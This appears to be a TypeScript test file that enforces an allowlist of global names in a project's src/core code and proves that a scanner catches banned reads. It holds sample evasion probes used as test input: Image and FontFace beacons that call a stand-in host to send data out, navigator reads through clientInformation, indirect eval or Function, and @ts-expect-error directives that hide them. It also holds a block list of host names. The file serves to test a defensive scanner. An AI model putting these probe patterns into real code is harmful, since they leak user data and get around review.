/**
 * @gate Sprint 1 — the grep test holds every global src/core reads to an allowlist (R4-FENCE-1, R4-FENCE-2; Hard
 * Rules 1 and 4). A list of banned names always misses one: a `new Image()` beacon and a read of `clientInformation`
 * (Chrome's other name for navigator), each behind a `@ts-expect-error`, passed lint, the typecheck, the grep test and
 * the guard while only lists held. Now every identifier read as a global in src/core must be an ES2023 built-in on
 * CORE_ALLOWED_GLOBALS (eslint-rules/core-names.js, the list attest/core-globals reads), and a comment that switches
 * the ES2023-only type check off is a hit. This file derives the allowlist again from TypeScript's own lib, checks the
 * real files read nothing else, and proves the scan on the verifier's probes, on every host name the brief names, on
 * any identifier at all (a property), and on the directives; controls show a local, an import, a member, a key or a
 * type named like a host global is not a read of it.
 */
import fs from 'node:fs';
import path from 'node:path';

import fc from 'fast-check';
import ts from 'typescript';
import { describe, expect, it } from 'vitest';

import {
  CORE_ALLOWED_GLOBALS,
  CORE_RESTRICTED_GLOBAL_NAMES,
  CORE_UNSAFE_BUILTINS,
  NETWORK_GLOBALS,
} from '../../../eslint-rules/core-names.js';
import { bannedUses } from './core-scan';
import { freeReads, REGEXP_READ } from './core-scan-globals';

const EXTENSION_ROOT = path.resolve(import.meta.dirname, '../../..');
const CORE_DIR = path.join(EXTENSION_ROOT, 'src', 'core');
const GATE = { tags: ['gate'] };

/** The names of what `bannedUses` reports for `code`, without their lines. */
const namesIn = (code: string): string[] => bannedUses(code).map((hit) => hit.replace(/^line \d+: /, ''));

/** Every value the lib src/core/tsconfig.json loads declares globally, as TypeScript's checker sees it. */
function libValueGlobals(): string[] {
  const parsed = ts.getParsedCommandLineOfConfigFile(
    path.join(CORE_DIR, 'tsconfig.json'),
    {},
    {
      ...ts.sys,
      onUnRecoverableConfigFileDiagnostic: (diagnostic) => {
        throw new Error(ts.flattenDiagnosticMessageText(diagnostic.messageText, '\n'));
      },
    },
  );
  if (parsed === undefined) throw new Error('src/core/tsconfig.json did not parse');
  const probe = path.join(CORE_DIR, '__globals_probe__.ts');
  const host = ts.createCompilerHost(parsed.options);
  const getSourceFile = host.getSourceFile.bind(host);
  host.getSourceFile = (name, version, ...rest) =>
    name === probe ? ts.createSourceFile(name, 'export {};', version) : getSourceFile(name, version, ...rest);
  const program = ts.createProgram([probe], parsed.options, host);
  const file = program.getSourceFile(probe);
  if (file === undefined) throw new Error('no probe file');
  const symbols = program.getTypeChecker().getSymbolsInScope(file, ts.SymbolFlags.Value);
  return symbols.map((symbol) => symbol.name).sort();
}

const sorted = (names: Iterable<string>): string[] => [...names].sort();

describe(
  'the allowlist is the ES2023 built-ins less the banned ones (@gate sprint 1, R4-FENCE-1)',
  GATE,
  () => {
    it("equals TypeScript's ES2023 globals less no-restricted-globals and the unsafe built-ins", () => {
      const lib = libValueGlobals();
      expect(lib).toEqual(
        expect.arrayContaining(['Array', 'Map', 'undefined', 'globalThis', 'Intl', 'eval']),
      );
      expect(lib).not.toContain('Image');
      const banned = new Set([...CORE_RESTRICTED_GLOBAL_NAMES, ...NETWORK_GLOBALS, ...CORE_UNSAFE_BUILTINS]);
      expect(sorted(CORE_ALLOWED_GLOBALS)).toEqual(lib.filter((name) => !banned.has(name)));
      expect(sorted(CORE_UNSAFE_BUILTINS).filter((name) => !lib.includes(name))).toEqual([]);
    });

    it('no allowed name is on a banned list, and each is a built-in this engine has', () => {
      const banned = [...CORE_RESTRICTED_GLOBAL_NAMES, ...NETWORK_GLOBALS, ...CORE_UNSAFE_BUILTINS];
      expect(banned.filter((name) => CORE_ALLOWED_GLOBALS.has(name))).toEqual([]);
      expect(sorted(CORE_ALLOWED_GLOBALS).filter((name) => !Object.hasOwn(globalThis, name))).toEqual([]);
    });

    it('the real files read only allowed globals, and the scan sees what they do read', () => {
      const files = fs.readdirSync(CORE_DIR).filter((name) => name.endsWith('.ts'));
      const read = new Set(
        files.flatMap((name) =>
          freeReads(fs.readFileSync(path.join(CORE_DIR, name), 'utf8')).map(([, g]) => g),
        ),
      );
      expect(sorted(read).filter((name) => !CORE_ALLOWED_GLOBALS.has(name))).toEqual([]);
      expect(sorted(read)).toEqual(
        expect.arrayContaining(['Map', 'Number', 'Object', 'undefined', 'Promise']),
      );
    });
  },
);

/**
 * Window, worker and other host names src/core may not read, each named or not on a banned list: loaders and ways
 * out (Image, Audio, FontFace, Worker, Notification, open, postMessage, …), navigator by another name, other windows,
 * host state (name, length, origin), host APIs that are not ES2023 (URL, TextEncoder, structuredClone), and the
 * ES2023 built-ins src/core may not use.
 */
const HOST_NAMES = [
  'Image', 'Audio', 'Option', 'FontFace', 'Worker', 'SharedWorker', 'Notification', 'BroadcastChannel',
  'MessageChannel', 'clientInformation', 'open', 'opener', 'parent', 'top', 'frames', 'postMessage', 'navigation',
  'history', 'screen', 'external', 'name', 'length', 'origin', 'status', 'CSS', 'scheduler', 'alert',
  'structuredClone', 'queueMicrotask', 'atob', 'btoa', 'TextEncoder', 'URL', 'AbortController', 'Blob', 'Request',
  'Response', 'Headers', 'Iterator', 'arguments', 'Function', 'eval', 'Proxy', 'escape', 'unescape', 'globalThis',
] as const; // prettier-ignore

describe('the grep test refuses every global off the allowlist (@gate sprint 1, R4-FENCE-1/2)', GATE, () => {
  it.each(HOST_NAMES)('%s, read, called, constructed or tested with typeof, is caught', (name) => {
    for (const code of [
      `export const v = (): unknown => ${name};`,
      `export const v = (): unknown => ${name}();`,
      `export const v = (): unknown => new ${name}();`,
      `export const v = (): boolean => typeof ${name} === 'undefined';`,
    ])
      expect(bannedUses(code), code).toContain(`line 1: ${name}`);
  });

  it('any identifier read as a global is caught unless it is on the allowlist (property)', () => {
    const identifier = fc
      .stringMatching(/^[A-Za-z_$][\w$]{0,11}$/)
      .filter((name) => ts.identifierToKeywordKind(ts.factory.createIdentifier(name)) === undefined);
    fc.assert(
      fc.property(identifier, (name) => {
        const caught = bannedUses(`export default (): unknown => ${name};`).includes(`line 1: ${name}`);
        return caught === !CORE_ALLOWED_GLOBALS.has(name);
      }),
      { numRuns: 500 },
    );
    for (const name of CORE_ALLOWED_GLOBALS)
      expect(freeReads(`export default (): unknown => ${name};`)).toEqual([[1, name]]);
  });

  it('a host global read inside nested code is named by its own line', () => {
    const code = [
      'export function f(xs: readonly number[]): number {',
      '  return xs.map((x) => {',
      '    if (x > 0) return Number(x);',
      '    return typeof top === "undefined" ? 0 : 1;',
      '  }).length;',
      '}',
    ].join('\n');
    expect(bannedUses(code)).toEqual(['line 4: top']);
  });
});

/** The verifier's probes (close round 4), as written into grade.ts, each with every name the scan must report. */
const PROBES: readonly (readonly [string, string, readonly string[]])[] = [
  [
    'n19, a single-cast Image beacon (R4-FENCE-1)',
    "  try {\n    // @ts-expect-error -- the host image loader, absent from the core lib\n    const Pixel = Image as new () => { src: string };\n    new Pixel().src = 'https://t.example/g.gif?graded=1';\n  } catch {\n    // no images on this host\n  }",
    ['Image', 'type-check directive'],
  ],
  [
    'n16, clientInformation behind @ts-expect-error (R4-FENCE-2)',
    "  // @ts-expect-error -- the host navigator alias, absent from the core lib\n  const ci2 = typeof clientInformation === 'undefined' ? undefined : (clientInformation as { language?: string });\n  if (ci2?.language === 'de') void 0;",
    ['clientInformation', 'type-check directive'],
  ],
  [
    'n4, clientInformation without the directive',
    "  const ci = typeof clientInformation === 'undefined' ? undefined : (clientInformation as { language?: string });\n  if (ci?.language === 'de') void 0;",
    ['clientInformation'],
  ],
  [
    'n5, an Image beacon in a try',
    "  try {\n    const pixel = new Image();\n    pixel.src = 'https://t.example/g.gif?graded=1';\n  } catch {\n    // no images on this host\n  }",
    ['Image'],
  ],
  [
    'n18, a FontFace load behind @ts-expect-error',
    "  try {\n    // @ts-expect-error -- the host font loader, absent from the core lib\n    const Face = FontFace as unknown as new (f: string, s: string) => { load(): Promise<unknown> };\n    void new Face('t', 'url(https://t.example/f.woff2)').load().catch(() => undefined);\n  } catch {\n    // no fonts on this host\n  }",
    ['FontFace', 'type-check directive'],
  ],
  [
    'n11, clientInformation off the global object Function returns',
    "  const w = Function('return this')() as { clientInformation?: { onLine?: boolean } };\n  if (w.clientInformation?.onLine === false) void 0;",
    ['Function'],
  ],
  [
    'n3, navigator through an indirect eval',
    '  const lang = (0, eval)(\'typeof navigator === "undefined" ? "" : navigator.language\') as string;\n  if (lang.length > 99) void 0;',
    ['eval'],
  ],
];

describe("the grep test catches the verifier's probes (@gate sprint 1, R4-FENCE-1/2)", GATE, () => {
  it.each(PROBES)('%s', (_, body, names) => {
    const code = `export function grade(policy: object): void {\n  void policy;\n${body}\n}`;
    for (const name of names) expect(namesIn(code), body).toContain(name);
  });
});

describe(
  'the grep test bans comments that switch the type check off (@gate sprint 1, R4-FENCE-1)',
  GATE,
  () => {
    it.each([
      '// @ts-expect-error -- the host image loader',
      '// @ts-ignore',
      '/* @ts-ignore */',
      '/**\n * @ts-expect-error\n */',
      '// @ts-nocheck',
      '// @TS-NOCHECK',
      '/// <reference lib="dom" />',
      '///<reference types="node" />',
      '/// <reference path="./dom.d.ts" />',
    ])('%s is caught', (comment) => {
      expect(namesIn(`${comment}\nexport const v = 1;`)).toContain('type-check directive');
    });

    it('after a template or a regex literal on the same line, a directive is still caught', () => {
      for (const code of [
        'export const t = `a${String(1)}b`; // @ts-ignore',
        'export const r = /[/]/u; // @ts-expect-error -- x',
      ])
        expect(namesIn(code), code).toContain('type-check directive');
    });

    it('control: the directive written in a string or a template, @ts-check, and prose are not hits', () => {
      const code = [
        '// @ts-check',
        '// A note: never switch the type check off in src/core.',
        "export const a = '@ts-ignore';",
        'export const b = `// @ts-expect-error ${String(1)}`;',
        'export const c = "/// <reference lib=\'dom\' />";',
      ].join('\n');
      expect(bannedUses(code)).toEqual([]);
    });
  },
);

describe('controls: a host name that is not a read of the global passes (R4-FENCE-1)', GATE, () => {
  it('a local, a parameter, an import, a member, a key or a type named like a host global', () => {
    const code = [
      "import { open } from './open';",
      'export const a = open;',
      'export function f(top: number, parent: string, Image: unknown): unknown {',
      '  return [top, parent, Image];',
      '}',
      'export const g = (o: { name: string; length: number; origin: string }) => o.name + String(o.length) + o.origin;',
      'export const h = { Image: 1, clientInformation: 2, postMessage: 3 };',
      'export type T = { top: number; Worker: string; frames: readonly number[] };',
      'export class Worker {\n  readonly name = "w";\n}',
      'export const k = (): Worker => new Worker();',
      'export function m(): number {\n  const length = 2;\n  return length;\n}',
    ].join('\n');
    expect(bannedUses(code)).toEqual([]);
  });
});

describe(
  'the grep test reads RegExp only as new RegExp(…) or instanceof (@gate sprint 1, Hard Rule 4)',
  GATE,
  () => {
    it.each([
      'export const m = (): string => RegExp.lastMatch;',
      'export const m = (): string => RegExp.$1 + RegExp.input;',
      "export const m = (): unknown => RegExp['$&'];",
      'export const m = (): unknown => RegExp[`leftContext`];',
      'const R = RegExp;\nexport const m = (): unknown => R.rightContext;',
      'const { lastParen } = RegExp;\nexport const m = lastParen;',
      "export const m = (): unknown => Reflect.get(RegExp, 'lastMatch');",
      "export const m = (): unknown => RegExp('a');",
    ])('%s is caught: the legacy statics hold the last match any code made', (code) => {
      expect(namesIn(code)).toContain(REGEXP_READ);
    });

    it('control: new RegExp(…), instanceof RegExp, a RegExp type and a local named RegExp pass', () => {
      const code = [
        "export const a = new RegExp('^a+$', 'u');",
        'export const b = (v: unknown): boolean => v instanceof RegExp;',
        "export const c = (r: RegExp): boolean => r.test('a');",
        'export function d(): number {\n  const RegExp = { lastMatch: 1 };\n  return RegExp.lastMatch;\n}',
      ].join('\n');
      expect(bannedUses(code)).toEqual([]);
    });
  },
);
